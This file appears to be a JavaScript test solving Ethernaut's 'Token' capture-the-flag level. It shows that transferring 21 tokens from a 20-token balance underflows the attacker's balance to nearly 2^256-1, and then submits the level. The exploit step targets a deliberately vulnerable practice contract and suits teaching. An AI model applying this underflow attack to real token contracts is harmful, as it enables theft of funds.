const TokenFactory = artifacts.require('./levels/TokenFactory.sol')
const Token = artifacts.require('./levels/Token.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")


describe("Challenge 5 - Token", function () {
    let ethernaut
    let level
    let instance
    let attacker
    let regularUser

    async function createLevelInstance() {
        const [_attacker, _regularUser] = await web3.eth.getAccounts()
        attacker = _attacker
        regularUser = _regularUser

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await TokenFactory.new()
        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Token
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("attacker has initial amount of tokens", async function () {
            const attackerBalance = await instance.balanceOf(attacker)
            expect(attackerBalance.toNumber()).to.eq(20)
        })
    })

    describe("Attack Execution", function () {
        it("increase attacker funds", async function () {
            /*
                Transfer malicious user's total balacnce plus some extra value;
                This will cause an underflow and malucious user's value will be around 2^256-1
            */
            await instance.transfer(regularUser, 21)
            const attackerBalance = await instance.balanceOf(attacker)

            expect(parseInt(attackerBalance)).to.be.gt(parseInt("10000000000000000000000000000000000000000"))
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})